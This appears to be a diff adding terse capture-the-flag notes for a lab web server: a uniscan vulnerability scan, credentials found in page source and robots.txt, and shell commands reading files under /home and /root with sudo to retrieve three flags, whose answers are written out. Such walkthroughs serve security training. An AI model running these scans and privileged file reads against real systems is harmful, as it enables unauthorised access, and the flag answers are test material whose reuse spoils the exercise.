@@ -1,0 +1,20 @@
+sudo uniscan -u http://10.10.195.194/ -qweds   
+found 
+| File check:
+| [+] CODE: 200 URL: http://10.10.195.194/index.html
+| [+] CODE: 200 URL: http://10.10.195.194/login.php
+| [+] CODE: 200 URL: http://10.10.195.194/robots.txt
+
+check page-source on 10.10.195.194 found username: R1ckRul3s
+in /robots.txt found password: Wubbalubbadubdub
+
+check http://10.10.195.194/Sup3rS3cretPickl3Ingred.txt
+found flag1: mr. meeseek hair
+
+cd /home; ls -la; pwd
+less /home/rick/'second ingredients'
+found flag2: 1 jerry tear
+
+sudo less /root/3rd.txt
+found flag3: fleeb juice
+
